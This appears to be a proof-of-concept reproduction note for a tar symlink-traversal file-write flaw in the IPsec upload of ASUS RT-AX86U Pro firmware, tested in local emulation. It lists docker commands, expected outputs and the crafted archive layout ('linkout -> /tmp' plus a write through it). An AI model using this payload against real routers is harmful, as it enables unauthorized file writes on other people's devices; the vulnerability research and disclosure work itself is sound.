# PoC Reproduction

## Environment

The reproduction was performed in a local, authorized firmware-emulation environment.

```text
Firmware: ASUS RT-AX86U Pro 3.0.0.6.102_37436
Rootfs: extracted squashfs-root
Runtime: Docker + qemu-arm-static
Target daemon: usr/sbin/httpd
```

## Direct Tar Primitive

Run:

```sh
docker run --rm --name firmrec-asus-ipsec-tar \
  -v "E:\competition\firmrec_friend_runtime_project\firmrec_friend_runtime_project\inout:/root/inout" \
  -v "E:\competition\firmrec_friend_runtime_project\firmrec_friend_runtime_project\scripts:/root/scripts" \
  --entrypoint bash firmrec-dev -lc 'chmod +x /root/scripts/verify_asus_rt_ax86u_pro_ipsec_tar_traversal_2026_06_09.sh && /root/scripts/verify_asus_rt_ax86u_pro_ipsec_tar_traversal_2026_06_09.sh'
```

Expected key result:

```text
### symlink marker
EXISTS /tmp/asus_tar_symlink_write: symlink traversal
```

## HTTP Upload Reproduction

Run:

```sh
docker run --rm --name firmrec-asus-ipsec-http \
  -v "E:\competition\firmrec_friend_runtime_project\firmrec_friend_runtime_project\inout:/root/inout" \
  -v "E:\competition\firmrec_friend_runtime_project\firmrec_friend_runtime_project\scripts:/root/scripts" \
  --entrypoint bash firmrec-dev -lc 'chmod +x /root/scripts/verify_asus_rt_ax86u_pro_ipsec_upload_symlink_write_2026_06_09.sh && /root/scripts/verify_asus_rt_ax86u_pro_ipsec_upload_symlink_write_2026_06_09.sh'
```

Expected key result:

```text
POST /login_v2.cgi 200
COOKIE asus_token=...
RAW_UPLOAD_RECV b'HTTP/1.0 200 OK...
EXISTS /tmp/asus_http_upload_symlink_write
CONTENT /tmp/asus_http_upload_symlink_write: HTTP_SYMLINK_WRITE
```

## Payload Shape

The crafted tarball contains:

```text
linkout -> /tmp
linkout/asus_http_upload_symlink_write
```

The second entry writes through the archive-created symlink. The file content used in the HTTP proof is:

```text
HTTP_SYMLINK_WRITE
```

## Notes

The tested endpoint is an authenticated web management endpoint. The current PoC uses an emulated login flow and a local test token. The PoC demonstrates the file-write primitive and does not execute commands.
